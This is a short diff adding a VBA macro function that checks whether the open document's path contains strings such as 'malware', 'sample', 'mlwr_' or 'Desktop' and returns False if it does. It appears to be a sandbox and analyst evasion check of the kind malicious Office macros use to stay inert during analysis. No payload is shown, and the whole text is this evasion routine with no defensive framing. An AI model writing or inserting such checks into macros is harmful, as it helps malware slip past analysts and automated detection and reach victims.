@@ -1,0 +1,18 @@
+Public Function checkFilenameBad()
+    badName = False
+    badNames = Array("malware", "myapp", "sample", ".bin", "mlwr_", "Desktop")
+
+    For Each n In badNames
+        If InStr(LCase(ActiveDocument.FullName), n) > 0 Then
+            badName = True
+        End If
+    Next
+
+    If badName Then
+        checkFilenameBad = False
+    Else
+        checkFilenameBad = True
+    End If
+
+End Function
+
